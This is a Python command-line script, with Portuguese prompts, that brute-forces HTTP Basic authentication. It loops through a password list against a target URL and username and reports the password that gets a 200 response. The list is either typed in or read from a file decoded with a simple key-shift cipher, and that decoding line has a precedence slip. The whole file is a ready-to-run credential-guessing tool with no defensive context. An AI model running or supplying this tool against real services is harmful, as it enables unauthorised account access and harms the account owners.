import requests
import argparse
import getpass

def brute_force_auth(url, username, passwords, verbose=False):
    for password in passwords:
        response = requests.get(url, auth=(username, password))
        if response.status_code == 200:
            print(f"Senha encontrada: {password}")
            if verbose:
                print(response.text)
            return
    print("Senha não encontrada.")

def read_password_protected_wordlist(wordlist_path):
    password = getpass.getpass(prompt="Digite a senha para a lista de senhas: ")
    with open(wordlist_path, 'r', encoding='utf-8', errors='ignore') as f:
        data = f.read()
        decrypted_data = ""
        for i in range(len(data)):
            key_c = password[i % len(password)]
            decrypted_c = chr(ord(data[i]) - ord(key_c) % 256)
            decrypted_data += decrypted_c
        return decrypted_data.split('\n')

if __name__ == '__main__':
    parser = argparse.ArgumentParser()
    parser.add_argument('url', help='URL de destino')
    parser.add_argument('-u', '--username', required=True, help='nome de usuário')
    parser.add_argument('-w', '--wordlist', required=True, help='caminho para lista de senhas protegida por senha')
    parser.add_argument('-v', '--verbose', action='store_true', help='exibir saída detalhada')
    args = parser.parse_args()

    wordlist = []
    if args.wordlist.lower() == 'input':
        while True:
            password = input("Digite uma senha (ou deixe em branco para finalizar): ")
            if not password:
                break
            wordlist.append(password)
    else:
        wordlist = read_password_protected_wordlist(args.wordlist)

    brute_force_auth(args.url, args.username, wordlist, args.verbose)

